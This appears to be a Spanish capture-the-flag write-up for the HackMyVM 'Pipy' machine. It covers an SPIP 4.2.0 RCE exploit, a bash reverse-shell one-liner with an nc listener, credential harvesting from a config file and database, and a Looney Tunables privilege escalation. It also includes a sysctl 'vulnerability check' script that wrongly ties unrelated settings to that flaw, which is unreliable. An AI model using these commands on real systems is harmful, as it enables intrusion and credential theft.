---
icon: flag
---

# Pipy HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 03:21 EDT
Nmap scan report for 192.168.5.58
Host is up (0.00046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: SPIP 4.2.0
|_http-title: Mi sitio SPIP
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:9F:B1:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.50 seconds
```

Veremos que tendremos un puerto `80` en el que aloja una pagina web, si entramos dentro de la misma veremos una pagina web normal con el `software` llamado `spip`, por lo que vamos a realizar un poco de `fuzzing` empezando con ver la tecnologia web que lleva por detras y que versiones tiene la misma.

## Whatweb

```shell
whatweb http://<IP>/
```

Info:

```
http://192.168.5.58/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.5.58], JQuery, MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.5.58/local/config.txt], Script[text/javascript], Title[Mi sitio SPIP], UncommonHeaders[composed-by,x-spip-cache]
```

Por lo que vemos en esta linea...

```
MetaGenerator[SPIP 4.2.0]
```

Dicho `software` esta utilizando la version `4.2.0`, vamos a investigar si dicha version es vulnerable a algo.

## Escalate user www-data

Si buscamos bien veremos que si lo es, justamente en `ExploitDB` veremos un `exploit` asociado a dicha vulnerabilidad en la que se puede realizar un `RCE` de forma no autenticada, por lo que vamos a utilizarlo.

URL = [Exploit SPIP 4.2.0](https://www.exploit-db.com/exploits/51536)

Una vez que nos lo hayamos descargado el archivo, vamos a utilizarlo de la siguiente forma:

```shell
python3 51536.py -u http://<IP>/ -c 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"'
```

Antes de enviarlo nos pondremos a al escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si lo enviamos y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.58] 43634
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pipy:/var/www/html$ whoami
whoami
www-data
```

Veremos que ha funcioando, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user

Si nos vamos a la `home` del usuario `www-data` que es `/usr/www/` podremos ver los siguiente archivos:

```
total 20
drwxr-xr-x  4 www-data www-data 4096 Oct  5  2023 .
drwxr-xr-x 14 root     root     4096 Oct  2  2023 ..
-rw-------  1 www-data www-data  130 Oct  5  2023 .bash_history
drwxrwxrwx  3 www-data www-data 4096 Oct  5  2023 .local
drwxr-xr-x 11 www-data www-data 4096 Oct  4  2023 html
```

Esto suele ser muy poco comun, vamos a ver el `.bash_history` a ver que contiene:

```
whoami
exit
exit
reset xterm
export TERM=xterm-256color
stty rows 51 cols 197
ls
nano
ls
cat config/connect.php
mysql -u root -p 
```

Vemos que ha realizado una conexion a `mysql`, pero antes a leido un archivo que contiene la carpeta `/html` por lo que vamos a leerlo:

```shell
cat /usr/www/html/config/connect.php
```

Info:

```
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

Vemos bastantes cosas interesantes, entre ellas las credenciales para conectarnos por `mysql` por lo que haremos lo siguiente:

```shell
mysql -h localhost -u root -pdbpassword
```

Info:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 64
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Con esto ya estaremos dentro, por lo que vamos a investigar un poco.

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| spip               |
| sys                |
+--------------------+
5 rows in set (0.049 sec)
```

Vamos a seleccionar la llamada `spip` que es la que no viene por defecto.

```mysql
use spip
show tables;
```

Info:

```
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)
```

De todas estas tablas la que mas nos interesa es la llamada `spip_auteurs` que es como la que contiene los usuarios, por lo que vamos a ver dicha informacion de la misma.

```mysql
select * from spip_auteurs;
```

Info:

```
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id_auteur | nom    | bio | email           | nom_site | url_site | login  | pass                                                         | low_sec | statut    | webmestre | maj                 | pgp | htpass | en_ligne            | alea_actuel                       | alea_futur                       | prefs                                                                                                               | cookie_oubli                                                                                                                                         | source | lang | imessage | backup_cles                                                                                                                                                                                                                                                                  |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|         1 | Angela |     | angela@pipy.htb |          |          | angela | 4ng3l4                                                       |         | 0minirezo | oui       | 2023-10-04 17:28:39 |     |        | 2023-10-04 13:50:34 | 387046876651c39a45bc836.13502903  | 465278670651d6da4349d85.01841245 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | NULL                                                                                                                                                 | spip   |      |          | 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM= |
|         2 | admin  |     | admin@pipy.htb  |          |          | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |         | 1comite   | non       | 2023-10-04 17:31:03 |     |        | 2023-10-04 17:31:03 | 1540227024651d7e881c21a5.84797952 | 439334464651da1526dbb90.67439545 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o= | spip   | fr   | oui      |                                                                                                                                                                                                                                                                              |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)
```

Veremos bastantes usuarios en ella, pero el usuario que mas nos interesa es el llamado `angela` ya que es el unico usuario que tiene la contraseña en texto plano y que esta en el sistema.

```
angela:4ng3l4
```

Vamos a conectarnos por `SSH` para obtener una `shell` mas limpia.

### SSH

```shell
ssh angela@<IP>
```

Metemos como contraseña `4ng3l4` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
dab37650d43787424362d5805140538d
```

## Escalate Privileges

Si investigamos tenemos con permisos `SUID` el siguiente binario:

```
263043     32 -rwsr-xr-x   1 root     root          30872 Feb 26  2022 /usr/bin/pkexec
```

Con esto podremos ser `root` directamente ya que tiene una vulnerabilidad en la que se puede ejecutar una shell directamente como `root`, pero vamos hacerlo como el creador lo ha creado.

Si investigamos un poco, veremos que el `kernel` tiene la siguiente version.

```shell
uname -r
```

Info:

```
5.15.0-84-generic
```

Vemos que es una version de `kernel` un poco baja, por lo que pude ser vulnerable a explotaciones dentro del mismo, vamos a probar con un `exploit` bastante conocido para esto.

URL = [Exploit DirtyPipe Kernel](https://www.exploit-db.com/exploits/50808)

Si vemos en esa pagina, veremos que el rango de versiones vulnerables esta dentro la nuestra, por lo que vamos a probarlo.

Pero sin suerte, no va a funcionar, investigando mucho y mirando otros `writeups` vi que es vulnerable a lo que se le llama `Looney Tunables` por lo que vamos a ver si es o no realmente vulnerable con un `script`.

> scann\_Looney\_Tunables.sh

```bash
#!/bin/bash

declare -A checks=(
  [kernel.dmesg_restrict]=1
  [kernel.yama.ptrace_scope]=1
  [fs.suid_dumpable]=0
  [kernel.unprivileged_bpf_disabled]=1
  [net.ipv4.conf.all.accept_redirects]=0
  [net.ipv4.conf.all.send_redirects]=0
  [net.ipv4.conf.all.accept_source_route]=0
)

vulnerable=0

for param in "${!checks[@]}"; do
  current=$(sysctl -n $param 2>/dev/null)
  if [ "$current" != "${checks[$param]}" ]; then
    echo "⚠️  $param = $current  (Inseguro, debería ser ${checks[$param]})"
    vulnerable=1
  else
    echo "✅ $param = $current (Seguro)"
  fi
done

if [ $vulnerable -eq 1 ]; then
  echo -e "\n⚠️ Tu sistema tiene configuraciones inseguras (Looney Tunables vulnerables)."
else
  echo -e "\n✅ Tu sistema está configurado de forma segura para estos parámetros."
fi
```

Ahora lo ejecutaremos de esta forma:

```shell
bash scann_Looney_Tunables.sh
```

Info:

```
⚠  net.ipv4.conf.all.accept_redirects = 1  (Inseguro, debería ser 0)
✅ kernel.dmesg_restrict = 1 (Seguro)
✅ kernel.yama.ptrace_scope = 1 (Seguro)
⚠  kernel.unprivileged_bpf_disabled = 2  (Inseguro, debería ser 1)
⚠  fs.suid_dumpable = 2  (Inseguro, debería ser 0)
✅ net.ipv4.conf.all.accept_source_route = 0 (Seguro)
⚠  net.ipv4.conf.all.send_redirects = 1  (Inseguro, debería ser 0)

⚠ Tu sistema tiene configuraciones inseguras (Looney Tunables vulnerables).
```

Veremos que efectivamente es vulnerable, por lo que vamos a descargarnos un `exploit` para aprovechar esto mismo.

URL = [Exploit Looney Tunables](https://github.com/hadrian3689/looney-tunables-CVE-2023-4911)

En este `GitHub` podremos ver que hay otra forma de comprobar si es vulnerable o no a este `exploit` y es ejecutando el siguiente comando:

```shell
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```

Info:

```
Segmentation fault (core dumped)
```

Por lo que vemos si lo es, ya que nos esta diciendo que se salio de la memoria dicha informacion y esto se debe a que se puede realizar un `Buffer Overflow` para obtener privilegios de `root`.

Vamos a descargarnos el repositorio, ya que la maquina victima tiene `git`.

```shell
git clone https://github.com/hadrian3689/looney-tunables-CVE-2023-4911.git
```

Una vez echo esto, vamos a ejecutar lo siguiente de esta forma ordenada.

```shell
chmod +x libc.py
python3 libc.py
gcc exp.c -o exp
```

Y ahora vamos a ejecutar dicho binario.

```shell
./exp
```

Info:

```
try 100
try 200
try 300
try 400
try 500
try 600
# whoami
root
```

Como veremos ha funcionado, esto puede tardar un buen rato, ya que va probando realizando varios intentos, pero al final acabamos obteniendo la shell como el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
ab55ed08716cd894e8097a87dafed016
```
